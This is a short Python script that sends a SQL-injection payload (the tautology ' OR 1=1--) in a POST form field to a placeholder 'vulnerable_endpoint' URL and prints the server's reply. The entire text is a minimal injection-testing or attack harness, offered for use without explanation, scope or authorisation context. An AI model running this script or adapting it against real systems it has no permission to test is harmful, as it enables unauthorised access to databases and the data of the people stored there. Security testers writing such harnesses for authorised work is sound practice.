import requests

# URL of the target (replace with the actual target URL)
target_url = "http://example.com/vulnerable_endpoint"

# Function to send SQL payloads and receive the response
def send_payload(payload):
    # Sends the payload to the target URL
    response = requests.post(target_url, data={"input_field": payload})
    return response.text

# Test the connection (example payload)
if __name__ == "__main__":
    test_payload = "' OR 1=1--"
    result = send_payload(test_payload)
    print("Response from server:", result)
